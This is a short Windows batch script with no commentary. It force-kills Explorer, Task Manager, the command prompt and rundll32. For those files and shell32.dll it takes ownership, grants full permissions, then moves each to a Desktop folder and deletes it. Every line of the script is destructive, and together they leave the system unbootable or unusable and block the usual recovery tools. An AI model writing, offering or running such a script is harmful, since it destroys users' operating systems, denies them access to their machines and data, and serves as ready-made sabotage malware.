echo off
taskkill /f /im explorer.exe
takeown /a /f C:\\Windows\\explorer.exe
icacls C:\\Windows\\explorer.exe /grant administrators:f
move C:\\Windows\\explorer.exe C:\\Users\\test\\Desktop\\explorer.exe
del C:\\Users\\test\\Desktop\\explorer.exe
taskkill /f /im taskmgr.exe
takeown /a /f C:\\Windows\\System32\\taskmgr.exe
icacls C:\\Windows\\System32\\taskmgr.exe /grant administrators:f
move C:\\Windows\\System32\\taskmgr.exe C:\\Users\\test\\Desktop\\taskmgr.exe
del C:\\Users\\test\\Desktop\\taskmgr.exe
taskkill /f /im cmd.exe
takeown /a /f C:\\Windows\\System32\\cmd.exe
icacls C:\\Windows\\System32\\cmd.exe /grant administrators:f
move C:\\Windows\\System32\\cmd.exe C:\\Users\\test\\Desktop\\cmd.exe
del C:\\Users\\test\\Desktop\\cmd.exe
taskkill /f /im rundll32.exe
takeown /a /f C:\\Windows\\System32\\rundll32.exe
icacls C:\\Windows\\System32\\rundll32.exe /grant administrators:f
move C:\\Windows\\System32\\rundll32.exe C:\\Users\\test\\Desktop\\rundll32.exe
del C:\\Users\\test\\Desktop\\rundll32.exe
takeown /a /f C:\\Windows\\System32\\shell32.dll
icacls C:\\Windows\\System32\\shell32.dll /grant administrators:f
move C:\\Windows\\System32\\shell32.dll C:\\Users\\test\\Desktop\\shell32.dll
del C:\\Users\\test\\Desktop\\shell32.dll
